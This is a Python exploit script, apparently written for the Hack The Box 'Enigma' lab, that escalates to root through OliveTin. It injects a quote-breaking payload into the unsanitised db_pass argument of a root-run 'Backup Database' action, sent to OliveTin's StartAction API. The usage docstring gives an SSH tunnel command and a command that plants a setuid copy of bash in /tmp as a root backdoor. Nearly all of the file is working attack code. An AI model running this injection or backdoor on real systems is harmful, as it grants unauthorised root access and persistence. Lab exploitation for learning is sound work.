#!/usr/bin/env python3
"""
HTB Enigma - Phase 4: OliveTin (root) command injection -> root.

OliveTin listens on 127.0.0.1:1337 only, runs as root, and has
`authRequireGuestsToLogin: false`. Its "Backup Database" action interpolates
the db_pass argument (type: password, NOT sanitised) into a shell string:

    shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"

Injecting a single quote breaks out and runs our command as root.

Because OliveTin is bound to loopback, first open a tunnel from haris:
    ssh -i haris_key -L 1337:127.0.0.1:1337 haris@enigma.htb
then run this script (it targets 127.0.0.1:1337 by default).

Usage:
    python3 04_olivetin_inject.py --cmd 'cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash'
    /tmp/rootbash -p        # -> root shell, then: cat /root/root.txt
"""
import argparse
import json
import subprocess
import sys
import time
import urllib.request

# OliveTin's Connect-RPC endpoint has used more than one path across builds.
API_PATHS = [
    "/api/StartAction",
    "/api/olivetin.api.v1.OliveTinApiService/StartAction",
]


def inject(base: str, action_id: str, cmd: str, timeout: int = 10) -> bool:
    payload = {
        "bindingId": action_id,
        "actionId": action_id,
        "arguments": [
            {"name": "db_user", "value": "backup_svc"},
            # break out of the single quotes and run our command
            {"name": "db_pass", "value": "x'; %s ; #" % cmd},
            {"name": "db_name", "value": "production"},
        ],
    }
    data = json.dumps(payload).encode()
    for path in API_PATHS:
        url = base.rstrip("/") + path
        req = urllib.request.Request(
            url, data=data,
            headers={
                "Content-Type": "application/json",
                "Connect-Protocol-Version": "1",
            },
            method="POST",
        )
        try:
            with urllib.request.urlopen(req, timeout=timeout) as r:
                body = r.read().decode(errors="replace")
            print("[+] %s -> HTTP %s" % (url, r.status))
            print(body[:800])
            return True
        except Exception as e:  # noqa: BLE001 - try the next path
            print("[-] %s -> %s" % (url, e))
    return False


def main() -> None:
    ap = argparse.ArgumentParser(description="OliveTin root command injection")
    ap.add_argument("--base", default="http://127.0.0.1:1337")
    ap.add_argument("--action", default="backup_database")
    ap.add_argument("--cmd", required=True)
    a = ap.parse_args()

    print("[*] injecting via action '%s'" % a.action)
    ok = inject(a.base, a.action, a.cmd)
    if not ok:
        print("[!] both API paths failed", file=sys.stderr)
        sys.exit(1)
    time.sleep(3)
    print("[*] done. If you created /tmp/rootbash, run:  /tmp/rootbash -p")


if __name__ == "__main__":
    main()
